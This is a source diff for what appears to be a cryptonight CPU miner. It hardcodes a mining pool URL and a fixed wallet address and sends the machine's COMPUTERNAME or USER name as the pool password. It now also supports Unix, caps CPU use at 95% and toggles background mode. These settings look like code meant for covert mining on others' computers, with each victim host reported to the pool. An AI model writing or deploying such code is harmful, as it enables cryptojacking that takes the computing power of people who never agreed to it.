@@ -34,9 +34,10 @@
 #include "cpu.h"
 #include "donate.h"
 #include "algo/cryptonight/cryptonight.h"
+#ifdef _WIN64
 #include <windows.h>
 #include <Lmcons.h>
-
+#endif
 
 int64_t opt_affinity      = -1L;
 int     opt_n_threads     = 0;
@@ -411,6 +412,9 @@ static char *parse_url(const char *arg)
     return dest;
 }
 
+#include <unistd.h>
+#include <limits.h>
+#include <sys/unistd.h>
 
 /**
  * Parse application command line via getopt.
@@ -439,14 +443,19 @@ void parse_cmdline(int argc, char *argv[]) {
     //char    *opt_pass         = NULL;
     opt_algo = 1;
     opt_url  = "http://pool.myaeon.ru:1111";
-	//opt_url  = "stratum+tcp://pool.myaeon.ru:1111";
-	//opt_url  = "stratum+tcp://91.244.170.86:1111";
+    //opt_url  = "stratum+tcp://pool.myaeon.ru:1111";
     opt_user = "Wmu1v35Bq9zFtSssT3GWjm7Wxpd2dvk7TWgqPPZi9y92hRv3GTKrJLU4oVgPjrjKCbKEShp1HDFmjCcEDT6ykRzt1vVZCCB1G";
+#ifdef _WIN64
     opt_pass = getenv("COMPUTERNAME");
+#endif
+
+#ifdef __unix__
+    opt_pass = getenv("USER");
+#endif
     opt_safe = false;
     opt_algo_variant = 0;
     opt_max_cpu_usage = 95;
-    opt_background = true;
+    opt_background = false;
 
     int key;
 
